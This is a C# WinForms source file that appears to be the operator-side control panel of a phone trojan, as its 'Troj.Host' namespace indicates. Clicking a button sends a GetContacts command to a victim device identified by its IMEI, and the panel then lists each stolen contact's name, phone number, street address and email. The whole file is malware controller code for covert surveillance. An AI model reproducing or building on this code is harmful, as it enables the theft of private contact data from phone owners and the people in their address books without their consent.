using System.Collections.Generic;
using System.Windows.Forms;
using InOut;
using InOut.Entity;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class ReadContractsPanel : UserControl
    {
        private readonly string imei;
        private readonly IServer server;

        public ReadContractsPanel(string imei , IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
        }

        private void btnSearch_Click(object sender, System.EventArgs e)
        {
             server.CommandSender(imei,Protocol.GetContacts,null);   
        }


        public void UpdateContacts(Contact[]  list)
        {
            if (list != null)
                Invoke(new MethodInvoker(() => UpdateContactsCore(list)));
        }

        private void UpdateContactsCore(IEnumerable<Contact> list)
        {
            lvContracts.Items.Clear();
            lvContracts.BeginUpdate();
            foreach (var contact in list)
            {
                string phoneNumber = (contact.Phones != null && contact.Phones.Length > 0) ? contact.Phones[0]:string.Empty;
                string email = (contact.Emails != null && contact.Emails.Length > 0) ? contact.Emails[0] : string.Empty;
                lvContracts.Items.Add(new ListViewItem(new[]
                {
                    contact.DisplayName,
                    phoneNumber,
                    contact.Street,
                    email
                }));
            }

            lvContracts.EndUpdate();
        }
    }
}
